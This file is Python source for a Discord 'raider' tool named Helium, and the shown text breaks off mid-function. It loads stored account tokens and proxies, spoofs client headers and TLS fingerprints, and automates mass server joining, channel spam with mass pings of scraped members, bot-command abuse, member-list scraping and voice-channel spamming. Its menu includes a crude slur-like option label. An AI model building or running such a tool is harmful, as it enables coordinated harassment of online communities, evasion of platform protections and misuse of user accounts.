import os

try:
    from colorama import Fore
    from colorist import ColorHex as h
    from datetime import datetime
    from os.path import isfile, join
    import base64
    import json
    import random
    import requests
    import string
    import threading
    import time
    import tls_client
    import uuid
    import websocket
except ModuleNotFoundError:
    os.system('title Helium - Installing dependencies')
    i = 0
    imports = ['requests', 'colorama', 'websocket', 'websocket-client', 'threading', 'uuid', 'datetime', 'tls_client', 'time', 'colorist']
    for _import in imports:
        i += 1
        os.system('cls')
        print(f"Installing dependencies... ({i}/11)")
        print(f"installing {_import}")
        os.system(f'pip install {_import} > nul')
    print('Finishing up...')
    from colorama import Fore
    from colorist import ColorHex as h
    from datetime import datetime
    from os.path import isfile, join
    import base64
    import json
    import os
    import random
    import requests
    import string
    import threading
    import time
    import tls_client
    import uuid
    import websocket

def Clear():
    os.system('cls')

Clear()
os.system('title Helium')

session = tls_client.Session("okhttp4_android_13",random_tls_extension_order=True)

def get_random_str(length: int) -> str:
    return "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(length)
    )

def wrapper(func):
    def wrapper(*args, **kwargs):
        Clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
}


class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "proxies": False,
                    "color" : "blue"
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                if not os.path.exists(file):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()

with open("data/proxies.txt") as f:
    proxies = f.read().splitlines()

with open("config.json") as f:
    config = json.load(f)

with open("data/tokens.txt", "r") as f:
    tokens = f.read().splitlines()

proxy = config["proxies"]
color = config["color"]

if proxy:
    session.proxies = {
        "http": f"http://{random.choice(proxies)}",
        "https": f"http://{random.choice(proxies)}",
    }

class Render:
    def __init__(self):
        self.size = os.get_terminal_size().columns
        if not color:
            self.background = C['light_blue']
        else:
            self.background = C[color]

    def render_ascii(self):
        Clear()
        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()
        with open("data/proxies.txt") as f:
            proxies = f.read().splitlines()
        os.system(f"title Helium - Connected as {os.getlogin()}")
        Clear()
        edges = ["╗", "║", "╚", "╝", "═", "╔"]
        title = f"""
{'██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
{'██║  ██║██╔════╝██║     ██║██║   ██║████╗ ████║'.center(self.size)}
{'███████║█████╗  ██║     ██║██║   ██║██╔████╔██║'.center(self.size)}
{'██╔══██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║'.center(self.size)}
{'██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║'.center(self.size)}
{'╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝'.center(self.size)}
"""
        for edge in edges:
            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
        print(title)

    def raider_options(self):
        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
        title = f"""{' '*44}{Fore.RESET} Loaded ‹{Fore.LIGHTCYAN_EX}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{Fore.LIGHTCYAN_EX}{len(proxies)}{Fore.RESET}> proxies

{'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
{'│ «01» Joiner            «07» Token Formatter    «13» Voice Joiner      «19» Call Spammer     │'.center(self.size)}
{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» DCounter Spam    │'.center(self.size)}
{'│ «03» Spammer           «09» Accept Rules       «15» Thread Spammer    «21» Inviter          |'.center(self.size)}
{'│ «04» Token Checker     «10» Guild Check        «16» Friender          «22» ???              │'.center(self.size)}
{'│ «05» Reactor           «11» Bio Changer        «17» Typer             «23» ???              │'.center(self.size)}
{'│ «06» Voice Raper       «12» Onliner            «18» Onboarding Bypass «24» Exit             │'.center(self.size)}
{'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
"""
        for edge in edges:
            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
        print(title)

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)

    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"
        print(response)

    def prompt(self, text, ask=None):
        response = f"[{C['light_blue']}{text}{C['white']}"
        if ask:
            response += f"? {C['gray']}(y/n){C['white']}]: "
        else:
            response += f"]: "
        return response

console = Render()

class Utils:
    def rangeCorrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    def getRanges(index, multiplier, memberCount):
        initialNum = int(index * multiplier)
        rangesList = [[initialNum, initialNum + 99]]
        if memberCount > initialNum + 99:
            rangesList.append([initialNum + 100, initialNum + 199])
        return Utils.rangeCorrector(rangesList)

    def parseGuildMemberListUpdate(response):
        memberdata = {
            "online_count": response["d"]["online_count"],
            "member_count": response["d"]["member_count"],
            "id": response["d"]["id"],
            "guild_id": response["d"]["guild_id"],
            "hoisted_roles": response["d"]["groups"],
            "types": [],
            "locations": [],
            "updates": [],
        }

        for chunk in response["d"]["ops"]:
            memberdata["types"].append(chunk["op"])
            if chunk["op"] in ("SYNC", "INVALIDATE"):
                memberdata["locations"].append(chunk["range"])
                if chunk["op"] == "SYNC":
                    memberdata["updates"].append(chunk["items"])
                else:
                    memberdata["updates"].append([])
            elif chunk["op"] in ("INSERT", "UPDATE", "DELETE"):
                memberdata["locations"].append(chunk["index"])
                if chunk["op"] == "DELETE":
                    memberdata["updates"].append([])
                else:
                    memberdata["updates"].append(chunk["item"])

        return memberdata


class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_roles, self.blacklisted_users = [], []
        
        self.socket_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=self.socket_headers,
            on_open=lambda ws: self.sock_open(ws),
            on_message=lambda ws, msg: self.sock_message(ws, msg), 
            on_close=lambda ws, close_code, close_msg: self.sock_close(
                ws, close_code, close_msg
            ),
        )

        self.endScraping = False

        self.guilds = {}
        self.members = {}

        self.ranges = [[0, 0]]
        self.lastRange = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever()
        return self.members

    def scrapeUsers(self):
        if self.endScraping == False:
            self.send(
                '{"op":14,"d":{"guild_id":"'
                + self.guild_id
                + '","typing":true,"activities":true,"threads":true,"channels":{"'
                + self.channel_id
                + '":'
                + json.dumps(self.ranges)
                + "}}}"
            )

    def sock_open(self, ws):
        self.send(
            '{"op":2,"d":{"token":"'
            + self.token
            + '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36","browser_version":"119.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}'
        )

    def heartbeatThread(self, interval):
        try:
            while True:
                self.send('{"op":1,"d":' + str(self.packets_recv) + "}")
                time.sleep(interval)
        except Exception as e:
            print(e)

    def sock_message(self, ws, message):
        decoded = json.loads(message)

        if decoded is None:
            return

        if decoded["op"] != 11:
            self.packets_recv += 1

        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeatThread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()

        if decoded["t"] == "READY":
            for guild in decoded["d"]["guilds"]:
                self.guilds[guild["id"]] = {"member_count": guild["member_count"]}

        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.getRanges(
                0, 100, self.guilds[self.guild_id]["member_count"]
            )
            self.scrapeUsers()

        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parseGuildMemberListUpdate(decoded)

            if parsed["guild_id"] == self.guild_id and (
                "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]
            ):
                for elem, index in enumerate(parsed["types"]):
                    if index == "SYNC":
                        if len(parsed["updates"][elem]) == 0:
                            self.endScraping = True
                            break

                        for item in parsed["updates"][elem]:
                            if "member" in item:
                                mem = item["member"]
                                obj = {
                                    "tag": mem["user"]["username"]
                                    + "#"
                                    + mem["user"]["discriminator"],
                                    "id": mem["user"]["id"],
                                }
                                if not mem["user"].get("bot"):
                                    self.members[mem["user"]["id"]] = obj

                    elif index == "UPDATE":
                        for item in parsed["updates"][elem]:
                            if "member" in item:
                                mem = item["member"]
                                obj = {
                                    "tag": mem["user"]["username"]
                                    + "#"
                                    + mem["user"]["discriminator"],
                                    "id": mem["user"]["id"],
                                }
                                if not mem["user"].get("bot"):
                                    self.members[mem["user"]["id"]] = obj

                    self.lastRange += 1
                    self.ranges = Utils.getRanges(
                        self.lastRange, 100, self.guilds[self.guild_id]["member_count"]
                    )
                    time.sleep(0.45)
                    self.scrapeUsers()

            if self.endScraping:
                self.close()

    def sock_close(self, ws, close_code, close_msg):
        pass


def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()

class WebSocketClient:
    def __init__(self, token):
        self.token = token
        self.ws = websocket.WebSocketApp("wss://gateway.discord.gg/?v=9&encoding=json")

    def connect(self):
        self.ws.on_open = self.on_open
        self.ws.run_forever()

    def on_open(self, ws):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "$os": "windows",
                    "$browser": "mybot",
                    "$device": "mybot",
                },
            },
        }
        ws.send(json.dumps(payload))

class Raider:
    def __init__(self):
        self.cookies = self.get_discord_cookies()
        self.props = self.super_properties()
        self.ws = websocket.WebSocket()

    def get_discord_cookies(self):
        try:
            response = requests.get("https://discord.com")
            match response.status_code:
                case 200:
                    return "; ".join(
                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                    ) + "; locale=en-US"
                case _:
                    return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
        except Exception as e:
            print(f"(ERR): {e} (get_discord_cookies)")

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Discord Client",
                "release_channel": "stable",
                "client_version": "1.0.9023",
                "os_version": "10.0.19045",
                "os_arch":"x64",
                "app_arch":"ia32",
                "system_locale": "en",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                "browser_version": "22.3.26",
                "client_build_number": 244358,
                "native_build_number": 39334,
                "client_event_source": None,
                "design_id": 0,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            print(f"(ERR): {e} (get_super_properties)")

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "x-discord-locale": "en-US",
            'x-debug-options': 'bugReporterEnabled',
            "x-super-properties": self.props,
        }

    def soundboard_sounds(self, token):
        return session.get("https://discord.com/api/v9/soundboard-default-sounds", headers=self.headers(token)).json()

    def joiner(self, token, invite):
        try:
            payload = {
                "session_id": uuid.uuid4().hex
            }

            response = session.post(
                f"https://canary.discord.com/api/v9/invites/{invite}",
                headers=self.headers(token),
                json=payload,
            )

            match response.status_code:
                case 200:
                    console.log("JOINED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f".gg/{invite}")
                case 400:
                    console.log("CAPTCHA", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f".gg/{invite}")
                case 429:
                    console.log("CLOUDFARE", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f".gg/{invite}")
                case _:
                    console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def leaver(self, token, guild):
        try:
            def get_guild_name(guild):
                in_guild = []
                for token in tokens:
                    response = session.get(
                        f"https://canary.discord.com/api/v9/guilds/{guild}",
                        headers=self.headers(token),
                    )

                    match response.status_code:
                        case 200:
                            in_guild.append(token)
                            try:
                                return response.json().get("name")
                            except:
                                return guild
                if not in_guild:
                    return guild
            self.guild = get_guild_name(guild)

            payload = {
                "lurking": False,
            }

            response = session.delete(
                f"https://canary.discord.com/api/v9/users/@me/guilds/{guild}",
                json=payload,
                headers=self.headers(token),
            )

            match response.status_code:
                case 204:
                    console.log("LEFT", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
                case _:
                    console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def emojis():
        emos = list("😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵😵‍💫🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑")
        random.shuffle(emos)
        emojis=""
        for emoji in emos:
            emojis+=emoji
        return emojis

    def avatar_changer(self, token):
        try:
            picture = [f for f in os.listdir("avatars/") if isfile(join("avatars/", f))]

            random_picture = random.choice(picture)
            with open(f"avatars/{random_picture}", "rb+") as f:
                encoded_string = base64.b64encode(f.read())

            payload = {
                'avatar': f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
            }

            response = session.patch(
                f"https://canary.discord.com/api/v9/users/@me", 
                headers=self.headers(token), 
                json=payload
            )

            match response.status_code:
                case 200:
                    print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)  

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": "windows",
                            "$browser": "Discord",
                            "$device": "desktop"
                        }
                    }
                }))
                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": False,
                        "self_deaf": False
                    }
                }))
                print(f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] {Fore.RESET}[{Fore.LIGHTCYAN_EX}Joined{Fore.RESET}] {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "$os": "Windows",
                            },
                        },
                    }
                )
            )
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def member_scrape(self, guild_id, channel_id):
        try:
            in_guild = []

            if not os.path.exists(f"scraped/{guild_id}.txt"):
                for token in tokens:
                    response = session.get(
                        f"https://canary.discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token),
                    )
                    match response.status_code:
                        case 200:
                            in_guild.append(token)
                            break

                if not in_guild:
                    console.log("Failed", C["red"], "Missing Access")
                token = random.choice(in_guild)
                members = scrape(token, guild_id, channel_id)
                with open(f"scraped/{guild_id}.txt", "a") as f:
                    f.write("\n".join(members))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def get_random_members(self, guild_id, count):
        try:
            with open(f"scraped/{guild_id}.txt") as f:
                members = f.read().splitlines()
            message = ""
            for _ in range(int(count)):
                message += f"<@!{random.choice(members)}>"
            return message
        except Exception as e:
            console.log("FAILED", C["red"], 'Failed to get Random Members', e)

    def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, emoiyspam=None):
        while True:
            if massping:
                msg = self.get_random_members(guild, int(pings))
                payload = {
                    "content": f"{message} {msg}"
                }
                
            else:
                payload = {
                    "content": message
                }

            if emoiyspam:
                payload = {
                    "content": Raider.emojis()
                }
            
            response = session.post(
                f"https://canary.discord.com/api/v9/channels/{channel}/messages",
                headers=self.headers(token),
                json=payload,
            )

            match response.status_code:
                case 200:
                    console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case 429:
                    retry_after = response.json().get("retry_after")
                    console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                    time.sleep(float(retry_after))
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
                    break

    def dyno_massping(self, token, guild, channel, message, count):
        try:
            while True:
                headers = self.headers(token)

                tag = get_random_str(6)

                headers[
                    "content-type"
                ] = "multipart/form-data; boundary=----WebKitFormBoundary8cOu4YCjwIllrLVf"
                
                pings = self.get_random_members(guild, int(count))
                data = (
                    '------WebKitFormBoundary8cOu4YCjwIllrLVf\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"161660517914509312","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1116144106687692895","id":"824701594749763611","name":"tag","type":1,"options":[{"type":1,"name":"create","options":[{"type":3,"name":"name","value":"%s"},{"type":3,"name":"content","value":"a```%s```a"}]}],"application_command":{"id":"824701594749763611","application_id":"161660517914509312","version":"1116144106687692895","default_member_permissions":null,"type":1,"nsfw":false,"name":"tag","description":"Get or create a tag","dm_permission":false,"contexts":null,"integration_types":[0],"options":[{"type":1,"name":"raw","description":"Get the raw tag for use copying/editing.","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"get","description":"Get a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"edit","description":"Edit a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"content","description":"Tag content","required":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"delete","description":"Delete a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"create","description":"Create a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"content","description":"Tag content","required":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"category","description":"Creates a tag category","options":[{"type":3,"name":"category","description":"Category name","required":true}]},{"type":1,"name":"categories","description":"Creates a tag category"},{"type":1,"name":"delcat","description":"Deletes a tag category","options":[{"type":3,"name":"category","description":"Category name","required":true,"autocomplete":true}]}]},"attachments":[]}}\r\n------WebKitFormBoundary8cOu4YCjwIllrLVf--\r\n'
                    % (guild, channel, uuid.uuid4().hex, tag, f"{message} {pings}")
                )

                response = session.post(
                    "https://canary.discord.com/api/v9/interactions",
                    headers=headers,
                    data=data,
                )

                match response.status_code:
                    case 204:
                        console.log("TAG", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", tag)
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
                time.sleep(5)

                headers[
                    "content-type"
                ] = "multipart/form-data; boundary=----WebKitFormBoundary7RNPUxNP2KkB0I2S"

                data = (
                    '------WebKitFormBoundary7RNPUxNP2KkB0I2S\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"161660517914509312","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1116144106687692895","id":"824701594749763611","name":"tag","type":1,"options":[{"type":1,"name":"raw","options":[{"type":3,"name":"name","value":"%s"}]}],"application_command":{"id":"824701594749763611","application_id":"161660517914509312","version":"1116144106687692895","default_member_permissions":null,"type":1,"nsfw":false,"name":"tag","description":"Get or create a tag","dm_permission":false,"contexts":null,"integration_types":[0],"options":[{"type":1,"name":"raw","description":"Get the raw tag for use copying/editing.","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"get","description":"Get a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"edit","description":"Edit a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"content","description":"Tag content","required":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"delete","description":"Delete a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"create","description":"Create a tag","options":[{"type":3,"name":"name","description":"Tag name","required":true,"autocomplete":true},{"type":3,"name":"content","description":"Tag content","required":true},{"type":3,"name":"category","description":"Tag category","autocomplete":true}]},{"type":1,"name":"category","description":"Creates a tag category","options":[{"type":3,"name":"category","description":"Category name","required":true}]},{"type":1,"name":"categories","description":"Creates a tag category"},{"type":1,"name":"delcat","description":"Deletes a tag category","options":[{"type":3,"name":"category","description":"Category name","required":true,"autocomplete":true}]}]},"attachments":[]}}\r\n------WebKitFormBoundary7RNPUxNP2KkB0I2S--\r\n'
                    % (guild, channel, uuid.uuid4().hex, tag)
                )

                response = session.post(
                    "https://canary.discord.com/api/v9/interactions",
                    headers=headers,
                    data=data,
                )

                match response.status_code:
                    case 204:
                        console.log("SENT", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", tag)
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
                time.sleep(5)
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def masspanel(self, token, guild, channel):
        try:
            while True:
                headers = self.headers(token)

                headers[
                    "content-type"
                ] = "multipart/form-data; boundary=----WebKitFormBoundary1hIjYVJbLUqgQTKR"

                data = (
                    '------WebKitFormBoundary1hIjYVJbLUqgQTKR\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"703886990948565003","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1014638915954675737","id":"1014638915954675733","name":"panel","type":1,"options":[],"application_command":{"id":"1014638915954675733","application_id":"703886990948565003","version":"1014638915954675737","default_member_permissions":null,"type":1,"nsfw":false,"name":"panel","description":"Send a verification panel/button in that channel","dm_permission":true,"contexts":null,"integration_types":[0]},"attachments":[]},"nonce":"1158803562642276352"}\r\n------WebKitFormBoundary1hIjYVJbLUqgQTKR--\r\n'
                    % (guild, channel, uuid.uuid4().hex)
                )

                time.sleep(3)

                response = session.post(
                    "https://canary.discord.com/api/v9/interactions",
                    headers=headers,
                    data=data,
                )

                match response.status_code:
                    case 204:
                        console.log("SEND", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    case 429:
                        retry_after = response.json().get("retry_after")
                        console.log("RATELIMIT", Fore.LIGHTYELLOW_EX, f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, guild_id, channel_id):
        ws = websocket.WebSocket()

        def check_for_guild(token):
            response = session.get(
                f'https://canary.discord.com/api/v9/guilds/{guild_id}', headers=self.headers(token)
            )
            match response.status_code:
                case 200:
                    return True
                case _:
                    console.log("Failed", C["red"], "Missing Access")

        def check_for_channel(token):
            if check_for_guild(token):
                response = session.get(
                    f'https://canary.discord.com/api/v9/channels/{channel_id}', headers=self.headers(token)
                )
                match response.status_code:
                    case 200:
                        return True
                    case _:
                        return False

        def run(token):
            if check_for_channel(token):
                console.log('Joined', C['green'], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", channel_id)
                self.voice_spammer(token, ws, guild_id, channel_id, True)
            else:
                console.log('Failed', C['red'], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", channel_id)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(run, args)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )
            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            ws.send(json.dumps({"op": 1, "d": None}))
